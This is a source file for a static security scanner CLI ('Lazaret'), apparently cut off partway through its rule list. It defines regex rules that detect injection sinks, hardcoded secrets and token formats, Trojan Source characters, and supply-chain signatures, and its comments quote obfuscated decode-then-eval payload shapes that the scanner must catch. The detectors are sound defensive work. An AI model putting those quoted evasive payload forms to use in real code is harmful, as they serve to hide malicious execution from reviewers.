#!/usr/bin/env python3
"""Lazaret CLI — static security & quality scanner for Python and JavaScript.

Usage:
    lazaret <directory> [options]          (or: python -m lazaret ...)

Options:
    --out-dir DIR   Directory for the default reports (default: the scan root)
    --html PATH     Write HTML project report (default: <out-dir>/lazaret-report.html)
    --json PATH     Write JSON report (default: <out-dir>/lazaret-report.json)
    --no-html       Skip HTML report
    --no-json       Skip JSON report
    --exclude NAME  Extra directory name to skip (repeatable)
    --ci            Exit with code 1 if the quality gate fails
    -q, --quiet     Only print the summary (no per-issue lines)

Exit codes: 0 scan ok (also when the gate fails without --ci); 1 quality gate
failed with --ci, or a hostile manifest (SC-MANIFEST-DEPTH); 2 usage error
(unknown option; target missing, not a directory, unreadable or empty);
3 report output error; 4 taint config rejected; 5 internal error.

Reports are written under the scan root (or --out-dir), never the current
working directory; writability and collisions are checked before scanning
(exit 3 on a problem), and pre-existing files not produced by Lazaret are
never silently overwritten (--force-overwrite to override).

Taint-config rules that fail validation (unknown category, empty pattern,
wrong type, unsafe regex) are never silently dropped: each produces a warning
naming the file, the rule and the reason. An explicit --taint-config that has
rejected rules, or that cannot be loaded at all, makes the scan exit 4, so CI
cannot silently lose coverage; a repository config (--trust-repo-config) does
the same only with --strict-taint-config.

No dependencies — runs on stock python3. Same ruleset as the Lazaret dashboard.
"""
import argparse
import base64
import bisect
import collections
import datetime
import errno
import html as html_mod
import io
import json
import keyword
import os
import posixpath
import re
import sys
import threading
import time
import unicodedata
import warnings

try:
    from lazaret.scanner import flow as lazaret_flow  # interprocedural / cross-file taint (optional)
except Exception:  # pragma: no cover
    lazaret_flow = None

from lazaret.scanner import reports as lazaret_report  # report paths: pre-scan validation, atomic writes
from lazaret.scanner import taintspec  # taint-config validation shared by both taint engines
from lazaret.scanner import _unicode13  # the Unicode every engine reads source text in
from lazaret.scanner import configsecrets  # config and data files: credentials only
from lazaret.scanner import autorun  # editor and AI-agent settings that run commands (SC-AUTORUN)
from lazaret.scanner import ghworkflow  # the workflows the Shai-Hulud worms planted (SC-WORKFLOW-*)
from lazaret.scanner import frameworks  # web framework models shared by both taint engines


def configure_stdio():
    """Never crash while printing, and print the same bytes on every platform.

    Reports use characters such as the check and cross marks. Redirected
    output (a pipe, a file, CI logs) otherwise takes its encoding from the
    host: the ANSI code page on Windows (cp1252, which can't encode them —
    print() would raise mid-report), and the locale elsewhere (ASCII under a
    bare C locale). So redirected output is always written as UTF-8, unless
    PYTHONIOENCODING explicitly asks for something else. A terminal keeps its
    own encoding (the Windows console is Unicode already). Everywhere,
    characters a stream can't encode are replaced rather than raised. Called
    at the start of every CLI entry point."""
    explicit = bool(os.environ.get("PYTHONIOENCODING"))
    for stream, errors in ((sys.stdout, "replace"), (sys.stderr, "backslashreplace")):
        reconfigure = getattr(stream, "reconfigure", None)
        if reconfigure is None:
            continue
        try:
            encoding = (getattr(stream, "encoding", None) or "").lower().replace("_", "-")
            if not explicit and not stream.isatty() and encoding not in ("utf-8", "utf8"):
                reconfigure(encoding="utf-8", errors=errors)
            else:
                reconfigure(errors=errors)
        except (OSError, ValueError):
            pass

# ---------------- Rules (mirrors lazaret.html) ----------------
SEV_ORDER = {"BLOCKER": 0, "CRITICAL": 1, "MAJOR": 2, "MINOR": 3, "INFO": 4}
TYPE_LABEL = {"VULN": "Vulnerability", "HOTSPOT": "Security Hotspot",
              "BUG": "Bug", "SMELL": "Code Smell"}

# ---- Provider token formats in linear time (S-TOKEN, secret redaction) ----
# The token pattern's JWT alternative, eyJ[A-Za-z0-9_\-]{10,}\.eyJ…, backtracks
# quadratically: on a run of "eyJeyJ…" every "eyJ" rescans the run to its end
# looking for the "." ('//' + 'eyJ' * 60,000: 21.2 s in S-TOKEN and as long
# again in snippet redaction, one regex call the time budget can't stop). A
# left boundary would make the regex linear but would stop matching a JWT
# glued to a preceding [A-Za-z0-9_-] character (an AWS key followed by one,
# say), so the pattern text stays and _TokenPattern matches exactly its
# language — the same leftmost matches, the same spans — in linear time, like
# the npm engine's findSecretToken (js/src/lib/redact.js). The other
# alternatives are linear as written and run as one regex. A JWT match starts
# at the first "eyJ" of a [A-Za-z0-9_-] run that is followed by ".eyJ" and ten
# more run characters, at least 13 characters before the run's end; every
# later "eyJ" of that run needs the same run end, so runs are examined once
# each, the candidate runs found by a C-speed look-ahead from each run start.
# _TokenPattern has the part of re.Pattern the scanner uses (pattern, flags,
# search, finditer, sub with a literal replacement).
_JWT_ALT = r"eyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}"
_JWT_CHARS = frozenset("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-")
_JWT_RUN_RE = re.compile(r"[A-Za-z0-9_\-]*")
_JWT_CANDIDATE_RE = re.compile(r"(?<![A-Za-z0-9_\-])(?=[A-Za-z0-9_\-]{13,}\.eyJ[A-Za-z0-9_\-]{10})")
_TOKEN_ALTS = (       # S-TOKEN, in pattern order
    r"AKIA[0-9A-Z]{16}", r"gh[pousr]_[A-Za-z0-9]{36}", r"xox[baprs]-[A-Za-z0-9-]{10,}",
    r"sk_live_[A-Za-z0-9]{16,}", r"AIza[0-9A-Za-z_\-]{35}", r"-----BEGIN [A-Z ]*PRIVATE KEY-----", _JWT_ALT)
_TOKEN_REDACT_ALTS = (    # the redaction list's first pattern (_SECRET_LINE_PATTERNS[0])
    r"AKIA[0-9A-Z]{16}", r"gh[pousr]_[A-Za-z0-9]{36,}", r"github_pat_[A-Za-z0-9_]{22,}",
    r"xox[baprs]-[A-Za-z0-9-]{10,}", r"sk_live_[A-Za-z0-9]{16,}", r"AIza[0-9A-Za-z_\-]{35}",
    r"-----BEGIN [A-Z ]*PRIVATE KEY-----(?:.*?-----END [A-Z ]*PRIVATE KEY-----|.*)", _JWT_ALT)


def _jwt_in_run(s, start, run_end):
    """(start, end) of the leftmost JWT-alternative match beginning in
    s[start:run_end], where run_end ends that [A-Za-z0-9_-] run; else None."""
    if run_end - start < 13 or not s.startswith(".eyJ", run_end):
        return None
    tail = _JWT_RUN_RE.match(s, run_end + 4).end()
    if tail - (run_end + 4) < 10:
        return None
    p = s.find("eyJ", start, run_end - 10)         # the "eyJ" plus ten run characters fit
    return (p, tail) if p >= 0 else None


def _jwt_search(s, pos):
    """(start, end) of the leftmost JWT-alternative match at or after pos."""
    if 0 < pos < len(s) and s[pos - 1] in _JWT_CHARS and s[pos] in _JWT_CHARS:
        run_end = _JWT_RUN_RE.match(s, pos).end()  # pos is inside a run: its rest counts
        hit = _jwt_in_run(s, pos, run_end)
        if hit:
            return hit
        pos = run_end
    for m in _JWT_CANDIDATE_RE.finditer(s, pos):
        hit = _jwt_in_run(s, m.start(), _JWT_RUN_RE.match(s, m.start()).end())
        if hit:
            return hit
    return None


class _TokenMatch:
    __slots__ = ("string", "_span")

    def __init__(self, string, span):
        self.string, self._span = string, span

    def start(self, group=0):
        return self._span[0]

    def end(self, group=0):
        return self._span[1]

    def span(self, group=0):
        return self._span

    def group(self, group=0):
        return self.string[self._span[0]:self._span[1]]

    __getitem__ = group


class _TokenPattern:
    """The regex "|".join(alternatives), the last one the JWT alternative,
    matched in linear time (see above)."""

    def __init__(self, alternatives):
        assert alternatives[-1] == _JWT_ALT
        self.alternatives = tuple(alternatives)
        self.pattern = "|".join(alternatives)
        self.flags = re.compile(self.pattern).flags
        self._others = re.compile("|".join(alternatives[:-1]))

    def _spans(self, s, pos):
        # Leftmost-first over both parts; a part's next match is recomputed
        # only once the scan has passed its start (a match at a position does
        # not depend on where the search began), so each part scans the
        # string once. The two never tie: their first characters differ.
        other = jwt = None
        fresh_other = fresh_jwt = False
        while True:
            if not fresh_other or (other is not None and other[0] < pos):
                m = self._others.search(s, pos)
                other, fresh_other = (m.span() if m else None), True
            if not fresh_jwt or (jwt is not None and jwt[0] < pos):
                jwt, fresh_jwt = _jwt_search(s, pos), True
            best = other if jwt is None or (other is not None and other[0] < jwt[0]) else jwt
            if best is None:
                return
            yield best
            pos = best[1]                          # matches are never empty

    def search(self, string, pos=0):
        span = next(self._spans(string, pos), None)
        return None if span is None else _TokenMatch(string, span)

    def finditer(self, string, pos=0):
        return (_TokenMatch(string, span) for span in self._spans(string, pos))

    def sub(self, repl, string):
        """re.sub with a literal replacement string."""
        parts, pos = [], 0
        for a, b in self._spans(string, 0):
            parts += (string[pos:a], repl)
            pos = b
        return string if not parts else "".join(parts) + string[pos:]


_TOKEN_PATTERN = _TokenPattern(_TOKEN_ALTS)
_TOKEN_REDACT_PATTERN = _TokenPattern(_TOKEN_REDACT_ALTS)


def R(id, name, type, sev, langs, pat, msg, why, fix, ref, skip=None, need=None, flags=0):
    return {"id": id, "name": name, "type": type, "sev": sev, "langs": langs,
            "re": pat if isinstance(pat, _TokenPattern) else re.compile(pat, flags),
            "msg": msg, "why": why, "fix": fix, "ref": ref,
            "skip": re.compile(skip, re.I) if skip else None,
            "need": re.compile(need, re.I) if need else None}

# Inline imports that evaluate to a module (SC-EVAL-DECODE prefix grammar):
# `__import__("mod")` / `importlib.import_module("mod")`.
_INLINE_IMPORT = (r"__import__\(\s*['\"][\w.]+['\"]\s*\)"
                  r"|importlib\.import_module\(\s*['\"][\w.]+['\"]\s*\)")


def _module_ref(name):
    """Pattern for module `name` written by name or imported inline."""
    return (rf"(?:{name}|__import__\(\s*['\"]{name}['\"]\s*\)"
            rf"|importlib\.import_module\(\s*['\"]{name}['\"]\s*\))")


# Indirect calls of eval and Function (review of the adversarial analysis:
# `(0, eval)(atob(p))`, `eval.call(null, atob(p))`, `window['eval'](atob(p))`
# and `globalThis["ev" + "al"](atob(p))` ran a decoded payload unseen): the
# comma operator's `(0, eval)(…)`, `eval.call(thisArg, …)`,
# `eval.apply(thisArg, […])` and `eval.bind(…)(…)`, `Reflect.apply(eval,
# thisArg, […])`, and a
# computed member named by a string literal, whole or cut into pieces joined
# with + (`window['eval']`, `self["Func" + "tion"]`). Each alternative ends
# where the payload argument begins; SC-EVAL-DECODE and the dependency decode
# flow take them as sinks.
_SPLIT_LITERAL = r"(?:['\"`]\s*\+\s*['\"`])?"
# `(0, window.eval)`: a global object may name them, no other receiver
# (TypeScript's CommonJS output calls every imported function as
# `(0, module_1.name)(…)`, and typebox exports one named Function)
_GLOBAL_OBJECT = r"(?:(?:window|globalThis|self|global|top|parent|frames)\s*\.\s*)?"
_EVAL_BY_NAME = r"\[\s*['\"`](?:" + _SPLIT_LITERAL.join("eval") + "|" + _SPLIT_LITERAL.join("Function") + r")['\"`]\s*\]"
_INDIRECT_EVAL = (
    r"\(\s*(?:void\s+)?[\w$.]+\s*,\s*" + _GLOBAL_OBJECT + r"(?:eval|Function)\s*\)\s*\("
    r"|\b(?:eval|Function)\s*\.\s*(?:call|apply)\s*\(\s*(?:void\s+)?[\w$.]*\s*,\s*\[?"
    r"|\b(?:eval|Function)\s*\.\s*bind\s*\([^()]*\)\s*\("
    r"|\bReflect\s*\.\s*apply\s*\(\s*" + _GLOBAL_OBJECT + r"(?:eval|Function)\s*,\s*(?:void\s+)?[\w$.]*\s*,\s*\["
    r"|" + _EVAL_BY_NAME + r"\s*\(")


RULES = [
R("S-EVAL-PY", "Dynamic code execution", "VULN", "CRITICAL", ("py",),
  r"(?<![\w.])(eval|exec)\s*\(",
  "Use of eval/exec enables arbitrary code execution.",
  "If any part of the evaluated string derives from user input, an attacker can run arbitrary code in your process.",
  "Replace with safe parsing (ast.literal_eval) or an explicit dispatch table.",
  "CWE-95 · OWASP A03: Injection"),
R("S-EVAL-JS", "Dynamic code execution", "VULN", "CRITICAL", ("js",),
  r"(?<![\w.])eval\s*\(",
  "Use of eval enables arbitrary code execution.",
  "If any part of the evaluated string derives from user input, an attacker can run arbitrary code.",
  "Replace with JSON.parse or an explicit dispatch table.",
  "CWE-95 · OWASP A03: Injection"),
R("S-NEWFUNC", "Function constructor", "VULN", "CRITICAL", ("js",),
  r"new\s+Function\s*\(",
  "new Function() compiles strings into code, equivalent to eval.",
  "String-built functions can execute attacker-controlled input.",
  "Define functions statically or use a whitelisted dispatch map.",
  "CWE-95 · OWASP A03"),
# G12: see scan_file()'s sql_sink_analyzer — the S-SQL-PY regex is only the
# fast path; the analyzer adds whole-argument analysis (cur.execute(sql % x)
# with no space, %-interpolation and .format() on template variables assigned
# earlier in the file, and string concatenation) that a line regex cannot see.
R("S-SQL-PY", "SQL built from strings", "VULN", "BLOCKER", ("py",),
  r"\.(execute|executemany)\s*\(\s*(f[\"']|[\"'][^\"']*[\"']\s*(%|\+|\.format))",
  "SQL query built with string formatting/concatenation.",
  "Interpolating values into SQL enables SQL injection — the classic path to full database compromise.",
  'Use parameterized queries: cursor.execute("SELECT … WHERE id = %s", (user_id,)).',
  "CWE-89 · OWASP A03"),
R("S-SQL-JS", "SQL built from strings", "VULN", "BLOCKER", ("js",),
  r"\.(query|execute)\s*\(\s*(`[^`]*\$\{|\"[^\"]*\"\s*\+|'[^']*'\s*\+|\w+\s*\+\s*[\"'`])",
  "SQL query built with template literal or concatenation.",
  "Interpolating values into SQL enables SQL injection.",
  "Use placeholders: db.query('SELECT … WHERE id = ?', [id]).",
  "CWE-89 · OWASP A03"),
R("S-OSCMD-PY", "OS command execution", "VULN", "CRITICAL", ("py",),
  _module_ref("os") + r"\s*\.\s*(system|popen)\s*\(",     # also __import__("os").system(
  "os.system/os.popen runs shell commands.",
  "Any user-influenced portion of the command allows shell injection.",
  "Use subprocess.run([...]) with a list of args and shell=False.",
  "CWE-78 · OWASP A03"),
R("S-SHELL-TRUE", "subprocess with shell=True", "VULN", "CRITICAL", ("py",),
  r"shell\s*=\s*True",
  "shell=True passes the command through the shell.",
  "Shell metacharacters in user input become command injection.",
  "Pass args as a list with shell=False.",
  "CWE-78"),
# Review fix: method names are not child_process calls. A receiver of this. /
# self. / super. (or a #private name), a definition prefix (async, static,
# get, set, function) and a definition shape — `name(params) {`, the
# parameter list followed by a block, as in a class body or an object
# literal — are excluded (56 false positives, all CRITICAL, in npm's own
# lib/: `async exec (args) {`, `return this.exec(args)`). Free calls
# (`exec(cmd)`, a destructured `const { exec } = require('child_process')`)
# and calls on any other receiver (`cp.exec(…)`, `child_process.exec(…)`,
# `require('child_process').exec(…)`) are still flagged.
R("S-EXEC-JS", "Shell exec", "HOTSPOT", "CRITICAL", ("js",),
  r"(?<![#$])(?<!\bthis\.)(?<!\bself\.)(?<!\bsuper\.)(?<!\basync\s)(?<!\bstatic\s)(?<!\bget\s)"
  r"(?<!\bset\s)(?<!\bfunction\s)\b(exec|execSync)\s*\((?![^()]*\)\s*\{)"
  r"\s*(`[^`]*\$\{|[\"'][^\"']*[\"']\s*\+|\w+\s*[,)+])",
  "child_process exec with dynamic command string.",
  "Dynamic command strings passed to a shell risk command injection.",
  "Use execFile/spawn with an argument array.",
  "CWE-78 · OWASP A03"),
R("S-PICKLE", "Unsafe deserialization (pickle)", "VULN", "CRITICAL", ("py",),
  r"pickle\.loads?\s*\(",
  "pickle.load(s) executes code embedded in the payload.",
  "Unpickling untrusted data is remote code execution by design.",
  "Use JSON or another data-only format for untrusted input.",
  "CWE-502 · OWASP A08"),
R("S-YAML", "Unsafe yaml.load", "VULN", "CRITICAL", ("py",),
  # the look-ahead stops at the next yaml.load as well as at ')' — it used to
  # rescan to the end of the line from every call ('yaml.load(' * 50k +
  # 'SafeLoader': 7 s). An outer call whose only SafeLoader belongs to a
  # nested yaml.load is now (correctly) flagged.
  r"yaml\.load\s*\((?!(?:(?!yaml\.load)[^)])*(?:SafeLoader|safe_load))",
  "yaml.load without SafeLoader can instantiate arbitrary objects.",
  "Full YAML loading executes constructors from the document.",
  "Use yaml.safe_load() or Loader=yaml.SafeLoader.",
  "CWE-502"),
R("S-SECRET", "Hardcoded credential", "VULN", "BLOCKER", ("py", "js"),
  r"(password|passwd|pwd|secret|api[_-]?key|access[_-]?key|auth[_-]?token|private[_-]?key)\s*[:=]\s*[\"'][^\"']{4,}[\"']",
  "Credential appears to be hardcoded in source.",
  "Secrets in code leak through version control, logs, and builds; rotation requires a deploy.",
  "Load secrets from environment variables or a secrets manager, and rotate this one now.",
  "CWE-798 · OWASP A07",
  # Verdict-integrity fix (audit C2): skip tokens used to match bare
  # substrings anywhere on the line. Word-bounded now; the bare `<...>`
  # pattern is gone — a real credential on the same line as an angle-bracket
  # generic no longer blinds the rule.
  skip=r"(environ|process\.env|getenv|config\[|\bimport\b|\bplaceholder\b|\bexample\b|\bdummy\b|\bsample\b|\bmock\b|\bmocked\b|\bxxxx+\b|\{\{)",
  flags=re.I),
R("S-WEAKHASH-PY", "Weak hash algorithm", "VULN", "MAJOR", ("py",),
  r"hashlib\.(md5|sha1)\s*\(",
  "MD5/SHA-1 are cryptographically broken.",
  "Collisions are practical; unusable for passwords or signatures.",
  "Use SHA-256+ for integrity; bcrypt/scrypt/argon2 for passwords.",
  "CWE-327/328"),
R("S-WEAKHASH-JS", "Weak hash algorithm", "VULN", "MAJOR", ("js",),
  r"createHash\s*\(\s*[\"'](md5|sha1)[\"']",
  "MD5/SHA-1 are cryptographically broken.",
  "Collisions are practical; unusable for passwords or signatures.",
  "Use sha256+ for integrity; bcrypt/scrypt/argon2 for passwords.",
  "CWE-327/328"),
R("S-VERIFY", "TLS verification disabled", "VULN", "MAJOR", ("py",),
  r"verify\s*=\s*False|_create_unverified_context",
  "Certificate verification is disabled.",
  "Disabling TLS verification allows trivial man-in-the-middle attacks.",
  "Keep verify=True; add the internal CA to the trust store instead.",
  "CWE-295 · OWASP A02"),
R("S-HTTP", "Cleartext HTTP URL", "HOTSPOT", "MINOR", ("py", "js"),
  r"[\"']http://(?!localhost|127\.0\.0\.1|0\.0\.0\.0)",
  "URL uses unencrypted http://.",
  "Data sent over HTTP can be read or altered in transit.",
  "Use https:// unless this is a deliberate local/dev endpoint.",
  "CWE-319 · OWASP A02"),
R("S-RANDOM", "Non-crypto randomness for secret", "HOTSPOT", "MAJOR", ("py", "js"),
  r"(random\.(random|randint|choice|randrange|getrandbits)|Math\.random)\s*\(",
  "PRNG used in a security-sensitive value.",
  "random/Math.random are predictable; generated tokens can be guessed.",
  "Use secrets module (Python) or crypto.randomBytes / crypto.getRandomValues (JS).",
  "CWE-338",
  need=r"(token|secret|password|otp|nonce|session|key|reset|csrf)"),
R("S-INNERHTML", "HTML injection sink", "HOTSPOT", "MAJOR", ("js",),
  r"\.(innerHTML|outerHTML)\s*=|document\.write\s*\(|insertAdjacentHTML\s*\(",
  "Assigning raw HTML — potential XSS sink.",
  "If the value contains user input, scripts can be injected into the page.",
  "Use textContent, or sanitize with DOMPurify before inserting HTML.",
  "CWE-79 · OWASP A03"),
R("S-DANGER", "dangerouslySetInnerHTML", "HOTSPOT", "MAJOR", ("js",),
  r"dangerouslySetInnerHTML",
  "React raw-HTML escape hatch in use.",
  "Bypasses React's XSS protection.",
  "Render as text, or sanitize the HTML first.",
  "CWE-79"),
R("S-TIMEOUT-STR", "setTimeout with string", "VULN", "MAJOR", ("js",),
  r"set(Timeout|Interval)\s*\(\s*[\"'`]",
  "String argument to setTimeout/setInterval is implied eval.",
  "The string is compiled and executed like eval.",
  "Pass a function reference instead.",
  "CWE-95"),
R("S-LOCALSTORAGE", "Secret in localStorage", "HOTSPOT", "MAJOR", ("js",),
  r"localStorage\.setItem\s*\(\s*[\"'][^\"']*(token|jwt|password|secret|auth)",
  "Sensitive value stored in localStorage.",
  "localStorage is readable by any script on the page (XSS steals it).",
  "Prefer httpOnly cookies for session tokens.",
  "CWE-522", flags=re.I),
# The optional '[' carries its own whitespace: `\s*\[?\s*` let the two \s*
# split a run of spaces every way ('algorithm=' + 60,000 spaces: 16.7 s).
R("S-JWT-NONE", "JWT 'none' algorithm", "VULN", "BLOCKER", ("js", "py"),
  r"algorithms?\s*[:=]\s*(?:\[\s*)?[\"']none[\"']",
  "JWT verification accepts the 'none' algorithm.",
  "Attackers can forge unsigned tokens that pass verification.",
  "Pin an explicit algorithm list, e.g. ['HS256'] or ['RS256'].",
  "CWE-347", flags=re.I),
R("S-CORS", "CORS wildcard", "HOTSPOT", "MAJOR", ("js", "py"),
  r"Access-Control-Allow-Origin[\"']?\s*[,:]\s*[\"']\*",
  "CORS allows all origins.",
  "Any website can call this API with the user's credentials context.",
  "Whitelist specific origins.",
  "OWASP A05"),
R("S-DEBUG", "Debug mode enabled", "HOTSPOT", "MAJOR", ("py",),
  r"debug\s*=\s*True",
  "debug=True — never in production.",
  "Flask/Django debug mode exposes an interactive console and stack traces.",
  "Drive debug from an environment variable, defaulting to off.",
  "CWE-489 · OWASP A05"),
R("S-BIND-ALL", "Binding to all interfaces", "HOTSPOT", "MINOR", ("py", "js"),
  r"[\"']0\.0\.0\.0[\"']",
  "Service binds to 0.0.0.0 (all interfaces).",
  "Exposes the service on every network interface, including public ones.",
  "Bind to 127.0.0.1 unless external access is intended.",
  "CWE-668"),
R("S-MKTEMP", "Insecure temp file", "VULN", "MAJOR", ("py",),
  r"tempfile\.mktemp\s*\(",
  "tempfile.mktemp is race-condition prone.",
  "The name can be claimed by an attacker between creation and use.",
  "Use tempfile.NamedTemporaryFile or mkstemp.",
  "CWE-377"),
R("B-BARE-EXCEPT", "Bare except", "BUG", "MAJOR", ("py",),
  r"^\s*except\s*:",
  "Bare except: catches everything, including SystemExit/KeyboardInterrupt.",
  "Hides real failures and makes the process unkillable.",
  "Catch the specific exception types you expect.",
  "Reliability"),
R("B-EQEQ", "Loose equality", "BUG", "MINOR", ("js",),
  r"[^=!<>]==[^=]|[^!]!=[^=]",
  "== / != perform type coercion.",
  "'' == 0 is true; coercion causes subtle logic bugs.",
  "Use === and !==.",
  "Reliability",
  skip=r"^\s*(//|\*|/\*)"),
R("Q-TODO", "TODO/FIXME marker", "SMELL", "INFO", ("py", "js", "sql"),
  r"\b(TODO|FIXME|XXX|HACK)\b",
  "Unresolved TODO/FIXME comment.",
  "Tracked work living only in comments tends to be forgotten.",
  "File a ticket and link it, or resolve it.",
  "Maintainability"),
R("Q-CONSOLE", "console.log left in code", "SMELL", "MINOR", ("js",),
  r"console\.(log|debug)\s*\(",
  "Debug logging left in code.",
  "Noisy output and possible data leakage in production.",
  "Remove, or use a leveled logger.",
  "Maintainability"),
R("Q-VAR", "var declaration", "SMELL", "MINOR", ("js",),
  r"\bvar\s+[A-Za-z_$]",
  "var is function-scoped and hoisted.",
  "Block-scoped declarations prevent shadowing bugs.",
  "Use let or const.",
  "Maintainability"),
# ---- Secret token signatures (Gitleaks-style) ----
# The pattern (text: _TOKEN_ALTS) runs in linear time; see _TokenPattern.
R("S-TOKEN", "Known secret token format", "VULN", "BLOCKER", ("py", "js"),
  _TOKEN_PATTERN,
  "String matches a known secret format (AWS/GitHub/Slack/Stripe/Google key, private key, or JWT).",
  "Provider-format tokens in source are live credentials until proven otherwise.",
  "Remove it, rotate the credential immediately, and load it from a secrets manager.",
  "CWE-798 · OWASP A07"),
# Review fix (shared semantics 5): Trojan Source. Bidi embedding/override/
# isolate controls reorder how a line DISPLAYS without changing how it is
# parsed. Flagged anywhere on a line, comment lines included.
R("S-BIDI", "Trojan Source bidi control", "VULN", "CRITICAL", ("py", "js", "sql"),
  r"[\u202a-\u202e\u2066-\u2069]",
  "Bidirectional control character in source (Trojan Source)",
  "Bidi override and isolate characters make code display in a different order than the "
  "compiler reads it, so reviewers approve logic that is not what runs (CVE-2021-42574).",
  "Remove the control characters; where a string really needs one, write it as an escape "
  "sequence (e.g. \\u202e) so it is visible.",
  "CWE-451 · CVE-2021-42574"),
# ---- Additional vulnerability classes ----
R("S-SSTI", "Template injection risk", "VULN", "CRITICAL", ("py",),
  r"render_template_string\s*\(\s*(?![\"'])",
  "render_template_string with a non-literal template.",
  "User input compiled as a Jinja2 template is server-side template injection → RCE.",
  "Pass data as template parameters; never build template source from input.",
  "CWE-1336 · OWASP A03"),
R("S-XML", "XML parsing without a hardened parser", "HOTSPOT", "MINOR", ("py",),
  r"(?:^|\s)(?:import\s+xml\.(?:etree|dom|sax)|from\s+xml\.(?:etree|dom|sax))",
  "Stdlib XML parsers are unsafe for untrusted input.",
  "xml.etree/dom/sax are vulnerable to entity-expansion and (historically) XXE attacks.",
  "Parse untrusted XML with a hardened parser such as defusedxml or lazaret.safexml.",
  "CWE-611"),
R("S-MARKSAFE", "mark_safe usage", "HOTSPOT", "MAJOR", ("py",),
  r"mark_safe\s*\(",
  "mark_safe bypasses Django's HTML escaping.",
  "If the value contains user input, this is an XSS vector.",
  "Escape user data; use format_html for building markup.",
  "CWE-79"),
R("S-AUTOESCAPE", "Template autoescape disabled", "VULN", "MAJOR", ("py",),
  r"autoescape\s*=\s*False",
  "Template autoescaping is turned off.",
  "Every rendered variable becomes a potential XSS vector.",
  "Leave autoescape on; mark trusted fragments individually.",
  "CWE-79"),
R("S-PARAMIKO", "SSH host key verification disabled", "VULN", "MAJOR", ("py",),
  r"AutoAddPolicy|WarningPolicy",
  "SSH host keys accepted without verification.",
  "Enables man-in-the-middle attacks on SSH connections.",
  "Use RejectPolicy with a managed known_hosts file.",
  "CWE-295"),
R("S-CLEARTEXT-PROTO", "Cleartext protocol module", "HOTSPOT", "MINOR", ("py",),
  r"(?:^|\s)(?:import\s+(?:telnetlib|ftplib)|from\s+(?:telnetlib|ftplib))",
  "Telnet/FTP transmit credentials in cleartext.",
  "Anyone on the network path can capture the credentials.",
  "Use SSH/SFTP (e.g. paramiko) instead.",
  "CWE-319"),
R("S-CHMOD", "Overly permissive file mode", "VULN", "MAJOR", ("py",),
  r"chmod\s*\([^,()]*,\s*0o?7[67]7",
  "File made world-writable (777/767).",
  "Any local user or process can modify the file.",
  "Use the least permissive mode that works (e.g. 0o600/0o644).",
  "CWE-732"),
R("S-WEAKCIPHER-PY", "Weak cipher or mode", "VULN", "MAJOR", ("py",),
  r"\b(?:DES|DES3|ARC4|Blowfish)\.new|MODE_ECB",
  "DES/RC4/Blowfish/ECB are cryptographically weak.",
  "These ciphers/modes are breakable or leak plaintext structure.",
  "Use AES-GCM (cryptography library, AESGCM).",
  "CWE-327"),
R("S-WEAKCIPHER-JS", "Weak cipher", "VULN", "MAJOR", ("js",),
  r"createCipheriv\s*\(\s*[\"'](?:des|des-ede3?|rc4|aes-\d+-ecb)",
  "DES/RC4/ECB are cryptographically weak.",
  "These ciphers/modes are breakable or leak plaintext structure.",
  "Use aes-256-gcm.",
  "CWE-327", flags=re.I),
R("S-PROTO", "Prototype pollution sink", "VULN", "MAJOR", ("js",),
  r"\[\s*[\"']__proto__[\"']\s*\]|\.__proto__\s*[=.[]|constructor\s*\[\s*[\"']prototype[\"']\s*\]",
  "Write access to __proto__/prototype.",
  "Attacker-controlled keys can pollute Object.prototype and change app behavior globally.",
  "Block __proto__/constructor/prototype keys in merges; use Object.create(null) maps.",
  "CWE-1321"),
R("S-NOSQL", "MongoDB $where operator", "VULN", "MAJOR", ("js",),
  r"\$where",
  "$where evaluates JavaScript inside the database.",
  "User input in $where is NoSQL injection with code execution.",
  "Use query operators ($eq, $in, …) instead.",
  "CWE-943"),
R("S-VM-JS", "vm module code execution", "HOTSPOT", "MAJOR", ("js",),
  r"vm\.runIn(?:New|This)?Context|require\s*\(\s*[\"']vm[\"']",
  "Node vm module is not a security sandbox.",
  "Code can escape the vm context and reach the host process.",
  "Don't run untrusted code in-process; use isolated workers/containers.",
  "CWE-94"),
R("S-SPAWN-SHELL", "child_process with shell:true", "VULN", "CRITICAL", ("js",),
  r"shell\s*:\s*true",
  "shell:true routes the command through a shell.",
  "Shell metacharacters in arguments become command injection.",
  "Use execFile/spawn with an args array and shell:false.",
  "CWE-78"),
# ---- Supply-chain / obfuscation indicators ----
# Review fix (shared semantics 13): execSync and vm.runIn*Context are sinks
# too, the decoder may be member-prefixed (`globalThis.atob`, `window.atob`,
# `base64.b64decode`), and bytes.fromhex / unhexlify are decoders. scan_file
# also matches this rule over a statement split across lines (`eval(\n
# atob(…))`, `exec(  # comment\n b64decode(…))`); dependency mode adds a
# decode-to-variable-to-sink flow (see _dep_decode_flow).
# A prefix segment may also be an inline import — `__import__("base64").` or
# `importlib.import_module("zlib").` (review: `exec(__import__("base64")
# .b64decode("…"))` was missed) — and a module-qualified decoder may name its
# module that way (`eval(__import__('codecs').decode(…))`). Every segment ends
# at a '.', so the prefix stays linear-time.
# `exec(compile(b64decode(…), …))` is the same thing with Python's compile()
# in between; it used to be caught only by SC-MARSHAL's `exec(compile(`.
R("SC-EVAL-DECODE", "Decoded payload execution", "VULN", "BLOCKER", ("py", "js"),
  r"(?:\b(?:eval|exec|execSync|Function|runIn(?:This|New)?Context)\s*\(|" + _INDIRECT_EVAL + r")"
  r"\s*(?:compile\s*\(\s*)?"
  r"(?:(?:[\w$]+|" + _INLINE_IMPORT + r")\s*\.\s*)*"
  r"(?:atob|unescape|decodeURIComponent|Buffer\s*\.\s*from|b64decode|"
  + _module_ref("codecs") + r"\s*\.\s*decode|" + _module_ref("zlib") + r"\s*\.\s*decompress|"
  + _module_ref("marshal") + r"\s*\.\s*loads|fromhex|unhexlify)\s*\(",
  "Code decoded (base64/escape) and immediately executed.",
  "Decode-then-execute is the signature pattern of malware droppers and supply-chain implants.",
  "Treat as hostile until proven otherwise; inspect the decoded payload.",
  "CWE-506 · Supply chain"),
# (0.1.8: MAJOR, a tool's mark; a packed payload that runs is SC-EVAL-DECODER's)
R("SC-PACKER", "Packed JavaScript (p,a,c,k,e,d)", "VULN", "MAJOR", ("js",),
  r"eval\s*\(\s*function\s*\(\s*p\s*,\s*a\s*,\s*c\s*,\s*k\s*,\s*e",
  "Dean Edwards packer signature — self-decoding packed code.",
  "Legitimate modern packages ship minified, not packed; packing hides intent.",
  "Unpack and review the payload before trusting this file.",
